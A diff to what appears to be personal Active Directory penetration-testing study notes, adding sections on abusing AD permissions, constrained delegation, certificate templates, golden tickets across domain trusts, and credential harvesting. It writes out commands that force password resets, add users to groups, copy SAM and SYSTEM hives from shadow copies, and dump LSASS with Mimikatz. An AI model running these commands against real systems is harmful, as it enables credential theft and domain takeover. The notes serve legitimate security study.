@@ -72,6 +72,7 @@ net accounts
 - [[RPCclient]]
 - [[Enum4Linux]]
 - [[Kerbrute]]
+- LOL Solutions (like the AD module)
 
 # Password Spraying
 - [[Kerbrute]]
@@ -215,6 +216,62 @@ If you can attach your own Windows VM to the domain, you can use these technique
 
 We can use GetUserSPNs from Impacket to get a TGT to crack with hashcat's mode 13100. Rubeus can be used for the same purpose from Windows. Both can be cracked with Hashcat -m 13100. Kerberoasting can also be performed across different domain with cross-domain trusts. This is especially useful for gaining access across an enterprise or gathering passwords that are not vulnerable in the current domain. 
 
+# Exploiting Dangerous Permissions
+Some examples of dangerous permissions include:
+- ForceChangePassword
+	- User can forcibly change another users' password
+- AddMembers
+	- Users with this permission can add users, groups, and computers to another group
+- GenericAll
+	- Complete control over an object
+- GenericWrite
+	- Update any non-protected parameters of a target object
+- WriteOwner
+	- Update owner of a target object
+- WriteDACL
+	- Write new ACEs to the target object's DACL
+- AllExtendedRights
+	- Permission to perform any action associated with extended AD rights (including for changing password etc.)
+- [[BloodHound]]
+- [[PowerView]]
+- Active Directory Module
+
+```powershell
+# Change an account password
+$Password = ConvertTo-SecureString "<new pass>" -AsPlainText -Force
+Set-ADAccountPassword -Identity "<AD user username>" -Reset -NewPassword $Password
+
+# Add a user to a group
+Add-ADGroupMember "IT Support" -Members "<AD user username>" 
+```
+
+# Exploiting Constrained Delegation
+```powershell
+Get-NetUser -TrustedToAuth # Powerview module to get service accounts trusted to authenticate users to services. (Accounts that can request a TGT)
+# Use mimikatz or rubeus to get credentials for this user
+
+# Begin a remote powershell session on a target machine (tickets should be in memory for an impersonated user delegating WSMAN and HTTP authority)
+New-PSSession -ComputerName <remote server name>
+Enter-PSSession -ComputerName <remote server name>
+```
+- [[Mimikatz]]
+- [[PowerView]]
+- [[Kekeo]]
+- [[BloodHound]]
+
+# Exploiting Certificate Misconfigurations
+Four attributes are required for a certificate misconfiguration to lead to privilege escalation:
+- Client Authentication
+- CT_FLAG_ENROLEE_SUPPLIES_SUBJECT
+- CTPRIVATEKEY_FLAG_EXPORTABLE_KEY
+- Certificate Permissions
+
+We can view all certificate templates using the following windows utility.
+
+```powershell
+certutil -Template -v > templates.txt
+```
+
 # Enumerating ACLs
 
 - [[PowerView]]
@@ -242,3 +299,38 @@ We can use GetUserSPNs from Impacket to get a TGT to crack with hashcat's mode 1
 # Domain Trusts
 - [[BloodHound]]
 - [[Impacket]]
+- [[Rubeus]]
+- [[Mimikatz]]
+
+If a domain is a child of another domain or forest, you can use default directional trusts to forge a golden ticket. Since the Administrator of the DC of the child domain by default has administrative privileges over the parent domain, we can compromise the entire enterprise with DA on the child domain. 
+
+# Credential Harvesting
+- Keylogging
+	- [[Meterpreter]]
+- Cleartext Credentials
+	- Command history
+	- Config files
+	- Backup files
+	- Shared files
+	- Registry
+		- `reg query <HKLM/HKCU> /f password /t REG_SZ /s
+	- Source code
+- SAM
+	- [[Meterpreter]] hashdump 
+	- Volume Shadow Copy
+```powershell
+wmic shadowcopy call create C:\
+vssadmin list shadows
+
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
+
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
+```
+- Registry Hives
+```powershell
+reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
+reg save HKLM\system C:\users\Administrator\Desktop\system-reg
+# From here you can use impacket-secretsDump to read the hashes out. 
+```
+- LSASS
+[[Mimikatz]] can dump and unprotect LSASS using sekurlsa and mimidrv.sys. 
